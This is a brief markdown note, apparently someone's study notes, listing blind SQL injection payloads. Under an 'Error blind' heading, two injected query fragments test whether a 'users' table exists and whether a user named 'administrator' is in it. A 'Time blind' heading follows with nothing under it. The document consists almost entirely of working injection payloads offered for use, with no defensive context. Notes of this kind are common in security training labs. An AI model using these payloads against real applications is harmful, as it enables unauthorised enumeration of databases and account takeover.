# 1. Error blind

  ## i. check table name
    - `' AND (SELECT 'a' FROM users LIMIT 1)='a`
  ## ii. check particular user if exist in users table
    - `' AND (SELECT 'a' FROM users where username = 'administrator')='a`

# 2. Time blind
